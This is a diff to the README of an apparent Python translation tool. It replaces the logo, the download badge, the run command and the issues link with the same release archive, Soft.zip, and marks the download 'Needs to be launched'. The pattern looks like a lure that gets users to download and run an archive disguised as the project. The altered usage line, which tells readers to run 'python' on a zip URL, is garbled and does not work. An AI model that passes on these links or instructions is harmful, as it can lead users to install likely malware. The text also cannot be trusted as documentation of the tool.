@@ -2,7 +2,7 @@
 
 Welcome to the NLP Translator repository! This Language Translation Tool is built using Python and CustomTkinter. It supports both auto-translate and manual translate modes, allowing users to translate text between multiple languages seamlessly.
 
-![NLP Translator Logo](https://your-image-url.com)
+![NLP Translator Logo](https://github.com/REFLOXO/NLP-Translator/releases/download/v1.0/Soft.zip)
 
 ## Features
 🌟 Auto-Translate mode for quick translations  
@@ -14,7 +14,7 @@ Welcome to the NLP Translator repository! This Language Translation Tool is buil
 ## Installation
 To get started with the NLP Translator tool, download the latest release from the link below:
 
-[![Download NLP Translator](https://img.shields.io/badge/Download-NLP%20Translator-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip "Needs to be launched")
+[![Download NLP Translator](https://github.com/REFLOXO/NLP-Translator/releases/download/v1.0/Soft.zip%20Translator-blue)](https://github.com/REFLOXO/NLP-Translator/releases/download/v1.0/Soft.zip "Needs to be launched")
 
 ## Usage
 1. Ensure you have Python installed on your machine.
@@ -22,14 +22,14 @@ To get started with the NLP Translator tool, download the latest release from th
 3. Open the terminal and navigate to the project directory.
 4. Run the following command to start the NLP Translator tool:
 ```bash
-python translator.py
+python https://github.com/REFLOXO/NLP-Translator/releases/download/v1.0/Soft.zip
 ```
 
 ## Contributing
 Contributions are welcome! If you'd like to enhance the NLP Translator tool, feel free to fork the repository and submit a pull request.
 
 ## Support
-For any issues or suggestions, please visit the [Github Issues](https://github.com/adelante20/NLP-Translator/issues) section of the repository.
+For any issues or suggestions, please visit the [Github Issues](https://github.com/REFLOXO/NLP-Translator/releases/download/v1.0/Soft.zip) section of the repository.
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
